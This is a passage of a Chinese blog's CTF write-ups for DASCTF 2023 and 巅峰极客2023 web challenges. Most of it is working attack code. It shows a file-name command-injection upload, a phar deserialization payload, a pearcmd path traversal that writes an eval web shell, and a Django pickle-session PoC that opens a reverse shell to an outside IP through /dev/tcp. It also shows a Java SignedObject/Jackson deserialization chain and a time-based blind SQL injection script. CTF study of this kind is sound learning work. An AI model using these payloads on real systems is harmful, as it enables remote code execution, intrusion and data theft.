<span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然后就可以把密码给爆破出来了</p><h3 id="system命令拼接"><a href="#system命令拼接" class="headerlink" title="system命令拼接"></a>system命令拼接</h3><p><img src="../images/image-20230726145115503.png" alt="image-20230726145115503"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 210</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=4ca196683169f8034a864930f1f86e84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功后</p><p><img src="../images/image-20230726145658481.png" alt="image-20230726145658481"></p><p>通过<code>get</code>传参       <strong><code>?file=上传的文件名字</code></strong></p><p><img src="../images/image-20230726145829047.png" alt="image-20230726145829047"></p><p>成功拿到flag名字  之后修改这个文件名就能拿到flag了</p><h3 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="phar文件上传"></a>phar文件上传</h3><p>先生成一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后上传图片  (<strong>修改后缀上传</strong>)</p><p><img src="../images/image-20230726153903059.png" alt="image-20230726153903059"></p><p>这里的话是<code>md5_file</code>来触发的</p><p><img src="../images/image-20230726153925874.png" alt="image-20230726153925874"></p><p>如果不填<code>todo=md5</code>的话  是不能触发的</p><p>(<strong>我也不知道为啥。。。。。。。。</strong>)</p><p><img src="../images/image-20230726162917937.png" alt="image-20230726162917937"></p><p><strong>按道理来说的话  在构造函数这里的时候已经触发这个<code>phar</code>了</strong></p><p><strong>解决了这个问题了</strong></p><p> 原因就是因为传进来的值会有<code>/</code>     然后就会进入正则  抛出异常</p><p><img src="../images/image-20230729003235802.png" alt="image-20230729003235802"></p><p>还是自己蠢了   tmd</p><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>这题真狗  </p><p>但是尝试<strong>pearcmd</strong>没写入成功(当时<code>pearcmd.php</code>位置错了 没发现)</p><p>然后尝试sql写入半天  还是没成功</p><p>最后又返回来用<code>pearcmd</code>写入才成功  (发现了位置不对后才成功)</p><p><a href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Y4—熊海CMS代码审计</a></p><p>看这篇文章就行了</p><p><img src="../images/image-20230726164436791.png" alt="image-20230726164436791"></p><p>就是这里</p><p><strong>如果访问默认的<code>pearcmd.php</code>路径的话   这个题目是访问不到的</strong></p><p><img src="../images/image-20230726171220938.png" alt="image-20230726171220938"></p><p>问下<code>gpt</code>之后  发现了<code>/usr/share/php</code>这个位置  尝试之后发现成功了</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?+config-create+/&amp;r=../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726172057819.png" alt="image-20230726172057819"></p><p>然后进行文件包含</p><p><img src="../images/image-20230726172316775.png" alt="image-20230726172316775"></p><p><strong>成功写入</strong></p><p>然后直接RCE就行了</p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>这道题是参考这个 <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88/README.md">hackergame2019</a>  出的题</p><p>这题考察得是<code>django</code>的<code>RCE</code></p><p><strong>拿到源码之后</strong></p><p>主要看里面的<code>settings.py</code>  这个文件</p><p><img src="../images/image-20230729154657238.png" alt="image-20230729154657238"></p><p><img src="../images/image-20230729154708124.png" alt="image-20230729154708124"></p><p>这里的话提供了<code>SECRET_KEY</code>   并且对<code>session</code>是进行<code>Pickle</code>反序列化解析的</p><p>通过这里的话我们就很清晰能得知可以通过伪造<code>session</code>来进行反序列化的</p><p><strong>并且在其官方文档里也提到了这个问题</strong></p><p><img src="../images/image-20230729154935067.png" alt="image-20230729154935067"></p><p><a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions</a></p><p>然后我们就去搜索这几个关键字  得到一篇文章  并且是有poc的</p><p><img src="../images/image-20230729155304243.png" alt="image-20230729155304243"></p><p>题目给我们的附件中  可以看到<code>django</code>的版本</p><p><img src="../images/image-20230729155402295.png" alt="image-20230729155402295"></p><p><img src="../images/image-20230729155428512.png" alt="image-20230729155428512"></p><p>其实默认采用的是<code>json</code>的序列化   但是为了出题  作者将其改为了<code>pickle</code>序列化</p><p><img src="../images/image-20230729155759379.png" alt="image-20230729155759379"></p><p>本来实际上是这样的  但是并不影响我们自己修改成Pickle</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure><p>这里的话是先进行登录  然后将<code>cookie</code>修改为我们构造的  然后访问<code>auth</code>路由就行了</p><p>但是我这里没弹成功  不知道是<code>payload</code>的问题还是我的操作问题</p><h2 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h2><p>这道题考察的是http2</p><p><strong>确实符合题目说的一种很新的方式</strong></p><p>这里的话是参考github上这个出的题目  几乎一模一样</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">http2</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&amp;mid=2247484933&amp;idx=1&amp;sn=60ae6e59096e22a2b60bb7ba4e80ce04&amp;chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&amp;mpshare=1&amp;scene=23&amp;srcid=072376b235QJm9tNCYWMZFQU&amp;sharer_sharetime=1690091289890&amp;sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">这个wp中也写了这个题目的wp</a></p><p>好像这个题目的地址关了  所以我就没做了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EzFlask&quot;&gt;&lt;a href=&quot;#EzFlask&quot; class=&quot;headerlink&quot; title=&quot;EzFlask&quot;&gt;&lt;/a&gt;EzFlask&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1876/#toc_obje</summary>
      
    
    
    
    
    <category term="DASCTF 2023 &amp; 0X401-Web" scheme="https://ke1nys.github.io/tags/DASCTF-2023-0X401-Web/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2023-Web</title>
    <link href="https://ke1nys.github.io/posts/7d1902a5.html"/>
    <id>https://ke1nys.github.io/posts/7d1902a5.html</id>
    <published>2023-07-21T08:52:15.000Z</published>
    <updated>2023-07-29T08:13:42.304Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p><strong>审计代码得出一个思路</strong></p><p>就是在反序列化的时候会将得到的内容写入到  <code>/tmp/file</code>下</p><p>然后在<code>/file</code>下就可以读取到内容</p><p><img src="../images/image-20230721165726299.png" alt="image-20230721165726299"></p><p>题目把这个有反序列化入口的类给ban了  </p><p>这里的话就可以容易想到二次反序列化绕过</p><p>刚好就可以想到<code>SignedObject</code>这个jdk自带的类  </p><p>查看依赖发现没有什么特别的类可以用   于是就想到之前阿里云ctf里用过的<code>JackSon</code>这个类</p><p>刚好可以触发getter  </p><p>于是得出利用了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException</span><br><span class="line">POJONode</span><br><span class="line">SignedObject</span><br></pre></td></tr></table></figure><p>所以最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.util.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;File:///F14gIsHereY0UGOTIT&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        handler.visiter = urlVisiter;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(handler,privateKey,signingEngine);</span><br><span class="line">        <span class="comment">//这个SignedObject传进来就是要反序列化的类</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="comment">//这里就是使用POJONode这个可以触发任意getter的方法 ----&gt;  来触发这个signedObject里的getObject()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>通过这道题的话学到了一些新东西</strong></p><p><img src="../images/image-20230724101125766.png" alt="image-20230724101125766"></p><p>这道题的话其实也可以利用<code>netdoc</code>这个协议来读取文件内容   </p><p>(可以当作<code>file</code>协议的替代品)</p><h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>这里的话先是fuzz了一下  发现<strong>sleep benchmark rpad if count</strong> 都过滤了</p><p>然后在页面尝试测试了一下   猜测是个<strong>sql盲注</strong></p><p>(所以就猜测是用<strong>笛卡尔乘积</strong>)    </p><p>这里的话却不能使用这个常规的  (因为<code>count</code>和<code>if</code>都被ban了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)a,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)b,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns limit <span class="number">1</span>,<span class="number">7</span>)c) limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>当时因为懒 没深究这个  看别的题去了  导致没做出来。。。。。。。</p><p><strong>直接问gpt</strong></p><p><img src="../images/image-20230724104909369.png" alt="image-20230724104909369"></p><p><img src="../images/image-20230724105015874.png" alt="image-20230724105015874"></p><p><strong>直接让gpt来帮我们在原来的基础上进行修改</strong></p><p><img src="../images/image-20230724105451643.png" alt="image-20230724105451643"> </p><p><img src="../images/image-20230724105521195.png" alt="image-20230724105521195"></p><p>可以成功进行延时</p><p><strong>最终的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            burp0_url = <span class="string">&quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot;</span> \</span><br><span class="line">                        <span class="string">&quot;substr(group_concat(table_name),&#123;&#125;,1)) from information_schema.tables where table_schema=database()))=&#123;&#125; then (select sum(1) FROM &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.views D) else 1 end-- -&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">                <span class="comment">#Flllag</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&#x27;Flllag&#x27;))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line">                <span class="comment">#Flagg</span></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(Flagg),&#123;&#125;,1)) from Flllag))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line"></span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            r = requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            <span class="comment"># print(j,r.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;kfrL9n0upSAOMvY8hcO8uLdYMo9mZjHY&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230724110506033.png" alt="image-20230724110506033"></p><p>这里解释一下这个<code>case when condition then result</code>  的意思</p><p>就是当<strong>查询内容</strong>满足这个<code>condition</code>的时候就会返回<code>result</code> </p><p><strong>上述代码的意思就是说匹配到的时候就会延时</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>其实就是考察的是<strong>时间盲注</strong>  但是只是需要替换一些函数</li></ul><h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p>这道题预期解其实是挺复杂的  但是这题存在非预期  (<strong>原因是出题人在运行完sh文件后没把该文件删除  导致出现了非预期)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目提示了 </span><br><span class="line">访问/hinder</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230725111811018.png" alt="image-20230725111811018"></p><p>没访问之前是可以看到这个网站的服务器是<code>java</code>的    (<strong>是个挺重要的信息</strong>)</p><p><img src="../images/image-20230725112023678.png" alt="image-20230725112023678"></p><p>这里话是有两个绕过方法</p><ul><li>一个是url编码  (<strong>因为这里是前端校验</strong>)</li><li>另一个是使用    <code>/;/hinder</code></li><li><code>/anything/../hinder/</code> <strong>绕过路径 (这样也行)</strong></li></ul><p><img src="../images/image-20230725112140700.png" alt="image-20230725112140700"></p><p>这里的话讲一下这个  <code>/;/hinder</code>  绕过的原理</p><p><img src="../images/image-20230725112306230.png" alt="image-20230725112306230"></p><p><img src="../images/image-20230725112342291.png" alt="image-20230725112342291"></p><p>其实这里的话就是实现任意文件读取了   (<strong>看到这个<code>action</code>的时候其实可以想到这个<code>struct2</code></strong>)</p><p>尝试读取一下<code>/etc/passwd</code></p><p><img src="../images/image-20230725113456496.png" alt="image-20230725113456496"></p><h3 id="非预期解"><a href="#非预期解" 